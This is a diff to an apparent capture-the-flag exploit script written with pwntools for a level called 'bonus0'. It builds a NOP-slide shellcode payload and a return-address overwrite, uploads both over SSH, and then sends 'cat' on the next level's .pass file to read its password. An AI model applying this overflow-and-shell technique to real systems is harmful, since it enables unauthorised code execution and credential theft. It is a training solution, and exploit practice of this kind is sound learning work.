@@ -53,8 +53,52 @@ def exploit():
  
     conn = get_connection()
     
+    shellcode = asm(shellcraft.i386.linux.sh())
+    nop_slide = b"\x90" * 100
+    payload_arg1 = nop_slide + shellcode + b'\n'
 
-    conn.interactive()
+    payload_arg2 = b"A" * 9 + p32(0xbfffe6d0) + b"B" * 7 
+
+    if LOCAL:
+        gdb.attach(conn, '''
+          break *p+28
+          continue
+          ''')
+
+    # print(conn.recvuntil(b'\n'))
+    # conn.sendline(payload_arg1)
+    # print(payload_arg1)
     
+    # print(conn.recvuntil(b'\n'))
+    # conn.sendline(payload_arg2)
+    # print(payload_arg2)
+
+
+    # Écrire les payloads dans /tmp/payload_a et /tmp/payload_b sur le serveur SSH si non LOCAL
+    if not LOCAL and SSH_SESSION is not None:
+        SSH_SESSION.upload_data(payload_arg1, "/tmp/payload_a")
+        SSH_SESSION.upload_data(payload_arg2, "/tmp/payload_b")
+        print("Payloads uploaded to /tmp/payload_a and /tmp/payload_b on remote server.")
+    try:
+        if not LOCAL:
+            conn.recvuntil(b'$')
+            conn.sendline(b'cat /home/user/bonus0/.pass')
+            flag = conn.recvline()
+            print("\n=== Flag ===")
+            print(flag.decode())
+        conn.interactive()
+    
+    except EOFError:
+        print("EOFError")
+        pass
+    except Exception as e:
+        print(e)
+        pass
+    finally:
+        conn.close()
+
+   
 if __name__ == "__main__":
     exploit()
+
+
